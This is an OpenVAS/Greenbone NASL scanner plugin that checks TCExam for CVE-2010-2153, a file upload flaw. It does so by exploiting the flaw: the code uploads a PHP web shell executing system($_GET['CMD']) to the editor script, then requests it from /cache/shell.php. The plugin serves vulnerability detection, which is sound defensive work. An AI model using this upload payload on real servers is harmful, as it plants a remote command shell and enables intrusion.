if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800793" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-06-11 14:27:58 +0200 (Fri, 11 Jun 2010)" );
	script_cve_id( "CVE-2010-2153" );
	script_bugtraq_id( 40511 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "TCExam 'tce_functions_tcecode_editor.php' File Upload Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/40011" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2010/1329" );
	script_xref( name: "URL", value: "http://cross-site-scripting.blogspot.com/2010/06/tcexam-101006-arbitrary-upload.html" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_tcexam_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "TCExam/installed" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to upload PHP
  scripts and execute arbitrary commands on a web server." );
	script_tag( name: "affected", value: "TCExam version 10.1.010 and prior." );
	script_tag( name: "insight", value: "The flaw is due to the access and input validation errors in the
  '/admin/code/tce_functions_tcecode_editor.php' script when uploading files." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to TCExam version 10.1.012." );
	script_tag( name: "summary", value: "This host is running TCExam and is prone to file upload
  vulnerability." );
	script_xref( name: "URL", value: "http://www.tecnick.com/public/code/cp_dpage.php?aiocp_dp=tcexam" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
tcPort = http_get_port( default: 80 );
tcVer = get_kb_item( "www/" + tcPort + "/TCExam" );
if(!tcVer){
	exit( 0 );
}
tcVer = eregmatch( pattern: "^(.+) under (/.*)$", string: tcVer );
if(tcVer[2] != NULL){
	useragent = http_get_user_agent();
	host = http_host_name( port: tcPort );
	content = NASLString( "------x\\r\\n", "Content-Disposition: form-data; name='sendfile0'\\r\\n", "\\r\\n", "shell.php\\r\\n", "------x\\r\\n", "Content-Disposition: form-data; name='userfile0'; filename='shell.php'\\r\\n", "Content-Type: application/octet-stream\\r\\n", "\\r\\n", "<?php echo '<pre>' + system($_GET['CMD']) + '</pre>'; ?>\\r\\n", "------x--\\r\\n", "\\r\\n" );
	if(tcVer[2] == "/"){
		tcVer[2] = "";
	}
	url = tcVer[2] + "/admin/code/tce_functions_tcecode_editor.php";
	header = NASLString( "POST " + url + " HTTP/1.1\\r\\n", "Host: " + host + "\\r\\n", "Proxy-Connection: keep-alive\\r\\n", "User-Agent: " + useragent + "\\r\\n", "Content-Length: " + strlen( content ) + "\\r\\n", "Cache-Control: max-age=0\\r\\n", "Origin: null\\r\\n", "Content-Type: multipart/form-data; boundary=----x\\r\\n", "Accept: text/html\\r\\n", "Accept-Encoding: gzip,deflate,sdch\\r\\n", "Accept-Language: en-US,en;q=0.8\\r\\n", "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\\r\\n", "Cookie: LastVisit=1275442604\\r\\n", "\\r\\n" );
	sndReq2 = header + content;
	rcvRes2 = http_keepalive_send_recv( port: tcPort, data: sndReq2 );
	shell_url = tcVer[2] + "/cache/shell.php";
	sndReq = http_get( item: shell_url, port: tcPort );
	rcvRes = http_send_recv( port: tcPort, data: sndReq );
	if(ContainsString( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "Cannot execute a blank command" )){
		report = http_report_vuln_url( port: tcPort, url: url );
		report += "\n\nUploaded file: " + http_report_vuln_url( port: tcPort, url: shell_url, url_only: TRUE );
		security_message( port: tcPort, data: report );
	}
}

